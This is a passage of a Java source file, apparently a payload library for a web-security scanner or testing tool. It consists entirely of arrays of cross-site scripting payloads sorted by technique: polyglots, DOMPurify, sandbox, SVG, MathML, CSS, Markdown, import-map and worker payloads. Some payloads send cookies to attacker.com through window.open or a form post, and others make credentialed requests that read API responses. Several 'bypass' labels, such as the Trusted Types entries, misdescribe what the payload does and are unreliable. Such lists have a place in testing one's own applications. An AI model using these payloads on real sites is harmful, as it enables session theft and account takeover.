        "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
        "<object data='javascript:alert(1)'></object>",
        "<embed src='javascript:alert(1)'></embed>"
    };
    
    // Same-Origin Policy bypass payloads
    public static final String[] SOP_BYPASS_PAYLOADS = {
        "<script>document.domain=location.hostname;alert('SOP Bypass')</script>",
        "<script>window.postMessage('alert(1)','*')</script>",
        "<script>parent.postMessage('alert(1)','*')</script>",
        "<script>top.postMessage('alert(1)','*')</script>",
        "<script>frames[0].postMessage('alert(1)','*')</script>",
        "<script>window.name='<script>alert(1)</script>';location.reload()</script>",
        "<script>document.cookie='test=value;domain=.'+location.hostname</script>"
    };
    
    // CORS bypass payloads
    public static final String[] CORS_BYPASS_PAYLOADS = {
        "<script>fetch(location.origin+'/api',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:document.cookie})})</script>",
        "<script>fetch(location.origin+'/api',{credentials:'include'}).then(r=>r.text()).then(t=>alert(t))</script>",
        "<script>XMLHttpRequest.prototype.open=function(){this.addEventListener('load',function(){alert(this.responseText)})}</script>",
        "<script>const xhr=new XMLHttpRequest();xhr.open('GET',location.origin+'/api');xhr.withCredentials=true;xhr.send()</script>"
    };
    
    // Iframe sandbox bypass payloads
    public static final String[] IFRAME_SANDBOX_BYPASS = {
        "<iframe sandbox='allow-scripts allow-same-origin' src='javascript:alert(1)'></iframe>",
        "<iframe sandbox='allow-scripts' srcdoc='<script>alert(1)</script>'></iframe>",
        "<iframe sandbox='allow-scripts allow-forms' src='data:text/html,<script>alert(1)</script>'></iframe>",
        "<iframe sandbox='allow-scripts allow-top-navigation' src='javascript:alert(1)'></iframe>",
        "<iframe sandbox='allow-scripts allow-popups' src='javascript:alert(1)'></iframe>",
        "<iframe sandbox='allow-scripts allow-modals' src='javascript:alert(1)'></iframe>"
    };
    
    // Polyglot XSS payloads (work in multiple contexts)
    public static final String[] POLYGLOT_XSS_PAYLOADS = {
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        "'\"><img/src/onerror=alert('XSS')>",
        "<svg/onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        "<script>alert(1)</script>",
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//",
        "<svg/onload=alert(String.fromCharCode(88,83,83))>",
        "<iframe src=javascript:alert(1)>",
        "<body onload=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<object data=javascript:alert(1)>",
        "<embed src=javascript:alert(1)>",
        "<form><button formaction=javascript:alert(1)>X</button></form>",
        "<math><mi xlink:href=javascript:alert(1)>X</mi></math>",
        "<svg><script>alert(1)</script></svg>",
        "<svg><foreignObject><body><script>alert(1)</script></body></foreignObject></svg>"
    };
    
    // Trusted Types bypass payloads
    public static final String[] TRUSTED_TYPES_BYPASS_PAYLOADS = {
        "<script>trustedTypes.createPolicy('default',{createHTML:s=>s})</script>",
        "<script>trustedTypes.createPolicy('default',{createScript:s=>s})</script>",
        "<script>trustedTypes.createPolicy('default',{createScriptURL:s=>s})</script>",
        "<script>if(typeof trustedTypes!=='undefined'){trustedTypes.createPolicy('default',{createHTML:s=>s})}</script>",
        "<script>document.body.innerHTML=trustedTypes.createPolicy('default',{createHTML:s=>s}).createHTML('<img src=x onerror=alert(1)>')</script>",
        "<script>const policy=trustedTypes.createPolicy('default',{createHTML:s=>s});document.body.innerHTML=policy.createHTML('<script>alert(1)</script>')</script>"
    };
    
    // Sanitizer API bypass payloads
    public static final String[] SANITIZER_API_BYPASS_PAYLOADS = {
        "<script>const sanitizer=new Sanitizer();document.body.setHTML('<img src=x onerror=alert(1)>',{sanitizer})</script>",
        "<script>const sanitizer=new Sanitizer({allowElements:['script','img']});document.body.setHTML('<script>alert(1)</script>',{sanitizer})</script>",
        "<script>const sanitizer=new Sanitizer({allowAttributes:{'onerror':['img']}});document.body.setHTML('<img src=x onerror=alert(1)>',{sanitizer})</script>",
        "<script>if(typeof Sanitizer!=='undefined'){const s=new Sanitizer();document.body.setHTML('<script>alert(1)</script>',{sanitizer:s})}</script>"
    };
    
    // DOMPurify bypass payloads
    public static final String[] DOMPURIFY_BYPASS_PAYLOADS = {
        "<svg><foreignObject><body><img src=x onerror=alert(1)></body></foreignObject></svg>",
        "<math><mi xlink:href=javascript:alert(1)>X</mi></math>",
        "<details open ontoggle=alert(1)>",
        "<form><button formaction=javascript:alert(1)>X</button></form>",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        "<svg><set onbegin=alert(1) attributeName=x>",
        "<svg><animateTransform onbegin=alert(1) attributeName=transform>",
        "<math><mi><mglyph><style><img src=x onerror=alert(1)></style></mglyph></mi></math>",
        "<svg><style><img src=x onerror=alert(1)></style></svg>",
        "<svg><script>alert(1)</script></svg>"
    };
    
    // SameSite cookie bypass payloads
    public static final String[] SAMESITE_COOKIE_BYPASS_PAYLOADS = {
        "<script>document.cookie='test=value;SameSite=None;Secure'</script>",
        "<script>fetch('/api',{credentials:'include',headers:{'Cookie':'test=value'}})</script>",
        "<script>const xhr=new XMLHttpRequest();xhr.open('GET','/api');xhr.withCredentials=true;xhr.setRequestHeader('Cookie','test=value');xhr.send()</script>",
        "<iframe src='https://attacker.com' sandbox='allow-scripts allow-same-origin'></iframe>",
        "<form action='https://attacker.com' method='post'><input name='cookie' value='document.cookie'></form>",
        "<script>window.open('https://attacker.com?cookie='+document.cookie)</script>"
    };
    
    // Header injection XSS payloads
    public static final String[] HEADER_INJECTION_XSS_PAYLOADS = {
        "Location: javascript:alert(1)",
        "X-Forwarded-For: <script>alert(1)</script>",
        "User-Agent: <script>alert(1)</script>",
        "Referer: javascript:alert(1)",
        "X-Real-IP: <img src=x onerror=alert(1)>",
        "X-Forwarded-Host: <script>alert(1)</script>",
        "X-Original-URL: javascript:alert(1)",
        "X-Rewrite-URL: <script>alert(1)</script>"
    };
    
    // Cookie injection XSS payloads
    public static final String[] COOKIE_INJECTION_XSS_PAYLOADS = {
        "<script>document.cookie='test=<script>alert(1)</script>'</script>",
        "<script>document.cookie='test=<img src=x onerror=alert(1)>'</script>",
        "<script>document.cookie='test=value;path=/<script>alert(1)</script>'</script>",
        "<script>document.cookie='test=value;domain=.'+location.hostname+'<script>alert(1)</script>'</script>",
        "<script>document.cookie='test=value;SameSite=None<script>alert(1)</script>'</script>"
    };
    
    // Advanced SVG XSS payloads
    public static final String[] ADVANCED_SVG_XSS_PAYLOADS = {
        "<svg><script>alert(1)</script></svg>",
        "<svg><foreignObject><body><script>alert(1)</script></body></foreignObject></svg>",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
        "<svg><set onbegin=alert(1) attributeName=x>",
        "<svg><animateTransform onbegin=alert(1) attributeName=transform>",
        "<svg><style><img src=x onerror=alert(1)></style></svg>",
        "<svg><script xlink:href=data:text/javascript,alert(1)></script></svg>",
        "<svg><a xlink:href=javascript:alert(1)><text>X</text></a></svg>",
        "<svg><image xlink:href=javascript:alert(1)></image></svg>",
        "<svg><use xlink:href=javascript:alert(1)></use></svg>",
        "<svg onload=alert(1)>",
        "<svg><g onload=alert(1)></g></svg>",
        "<svg><circle onload=alert(1)></circle></svg>"
    };
    
    // Advanced CSS injection payloads
    public static final String[] ADVANCED_CSS_INJECTION_PAYLOADS = {
        "<style>body{background:url('javascript:alert(1)')}</style>",
        "<style>@import'javascript:alert(1)'</style>",
        "<style>body{expression(alert(1))}</style>",
        "<style>body{-moz-binding:url('javascript:alert(1)')}</style>",
        "<style>body{behavior:url('javascript:alert(1)')}</style>",
        "<style>body{background-image:url('javascript:alert(1)')}</style>",
        "<style>body{filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='javascript:alert(1)')}</style>",
        "<link rel=stylesheet href=javascript:alert(1)>",
        "<style>@keyframes x{from{background:url('javascript:alert(1)')}}</style>",
        "<style>body{animation-name:url('javascript:alert(1)')}</style>"
    };
    
    // Markdown XSS payloads
    public static final String[] MARKDOWN_XSS_PAYLOADS = {
        "[XSS](javascript:alert(1))",
        "![XSS](javascript:alert(1))",
        "[XSS](data:text/html,<script>alert(1)</script>)",
        "<script>alert(1)</script>",
        "![XSS](x\"onerror=\"alert(1)\")",
        "[XSS](javascript:alert(String.fromCharCode(88,83,83)))",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "[XSS](vbscript:alert(1))",
        "[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)"
    };
    
    // MathML XSS payloads
    public static final String[] MATHML_XSS_PAYLOADS = {
        "<math><mi xlink:href=javascript:alert(1)>X</mi></math>",
        "<math><mi><mglyph><style><img src=x onerror=alert(1)></style></mglyph></mi></math>",
        "<math><mi><mglyph><img src=x onerror=alert(1)></mglyph></mi></math>",
        "<math><annotation-xml><svg><script>alert(1)</script></svg></annotation-xml></math>",
        "<math><mi><script>alert(1)</script></mi></math>",
        "<math><mtext><script>alert(1)</script></mtext></math>"
    };
    
    // Blob/File API XSS payloads
    public static final String[] BLOB_FILE_API_XSS_PAYLOADS = {
        "<script>const blob=new Blob(['<script>alert(1)</script>'],{type:'text/html'});const url=URL.createObjectURL(blob);location.href=url</script>",
        "<script>const blob=new Blob(['<img src=x onerror=alert(1)>'],{type:'text/html'});const url=URL.createObjectURL(blob);window.open(url)</script>",
        "<script>const file=new File(['<script>alert(1)</script>'],'test.html',{type:'text/html'});const url=URL.createObjectURL(file);location.href=url</script>",
        "<script>fetch('data:text/html,<script>alert(1)</script>').then(r=>r.blob()).then(b=>{const u=URL.createObjectURL(b);location.href=u})</script>",
        "<script>const reader=new FileReader();reader.onload=function(e){eval(e.target.result)};reader.readAsText(new Blob(['alert(1)'],{type:'text/javascript'}))</script>"
    };
    
    // Import Maps XSS payloads
    public static final String[] IMPORT_MAPS_XSS_PAYLOADS = {
        "<script type=importmap>{\"imports\":{\"test\":\"javascript:alert(1)\"}}</script>",
        "<script type=importmap>{\"imports\":{\"test\":\"data:text/javascript,alert(1)\"}}</script>",
        "<script type=importmap>{\"imports\":{\"test\":\"blob:javascript:alert(1)\"}}</script>",
        "<script type=importmap>{\"scopes\":{\"/\":{\"test\":\"javascript:alert(1)\"}}}</script>",
        "<script type=importmap>{\"imports\":{\"test\":\"<script>alert(1)</script>\"}}</script>"
    };
    
    // Module Workers XSS payloads
    public static final String[] MODULE_WORKERS_XSS_PAYLOADS = {
        "<script>const worker=new Worker('data:text/javascript,postMessage(\\'<script>alert(1)</script>\\')',{type:'module'});worker.onmessage=e=>eval(e.data)</script>",
        "<script>const worker=new Worker('javascript:alert(1)',{type:'module'});</script>",
        "<script>const worker=new SharedWorker('data:text/javascript,postMessage(\\'<script>alert(1)</script>\\')',{type:'module'});worker.port.onmessage=e=>eval(e.data)</script>",
        "<script>const worker=new Worker(URL.createObjectURL(new Blob(['postMessage(\\'<script>alert(1)</script>\\')'],{type:'text/javascript'})),{type:'module'});worker.onmessage=e=>eval(e.data)</script>"
    };
}
